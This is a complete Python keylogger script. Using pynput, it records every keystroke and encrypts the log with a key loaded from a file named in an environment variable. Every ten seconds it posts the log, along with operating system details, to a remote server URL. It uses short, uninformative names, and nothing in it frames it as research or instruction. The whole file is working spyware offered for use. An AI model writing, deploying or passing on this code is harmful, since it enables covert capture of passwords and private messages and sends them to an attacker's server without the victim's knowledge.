import os
import sys
import platform
import time
import requests
from cryptography.fernet import Fernet
from pynput import keyboard
from dotenv import load_dotenv

load_dotenv()

class K:
    def __init__(self, server_url):
        self.l = ""
        self.server_url = server_url
        self.i = 10 
        self.k = self.lk()
        self.cs = Fernet(self.k)

    def lk(self):
        pf = os.environ.get("pf")
        if not pf:
            sys.exit(1)
        return open(pf, 'rb').read()

    def op(self, k):
        try:
            if k.char:
                self.l += k.char
        except AttributeError:
            if k == keyboard.Key.space:
                self.l += " "
            else:
                self.l += f" {str(k)} "

    def el(self):
        encrypted_log = self.cs.encrypt(self.l.encode())
        return encrypted_log

    def sm(self):
        if self.l:
            try:
                el = self.el()
                si = f"OS: {platform.system()} {platform.release()} ({platform.version()})"

                data = {
                    'encrypted_log': el.decode(),
                    'system_info': si
                }

                response = requests.post(self.server_url, json=data)
                if response.status_code != 200:
                    print(f"Error: {response.status_code} - {response.text}")

            except Exception as e:
                print(f"Error: {e}")
            self.l = ""

    def start(self):
        print("Keylogger started")
        listener = keyboard.Listener(on_press=self.op)
        listener.start()

        try:
            while True:
                time.sleep(self.i)
                self.sm()
        except KeyboardInterrupt:
            listener.stop()


if __name__ == "__main__":
    server_url = os.environ.get("sv")
    if not server_url:
        sys.exit("SERVER_URL environment variable not set")
    k = K(server_url)
    k.start()
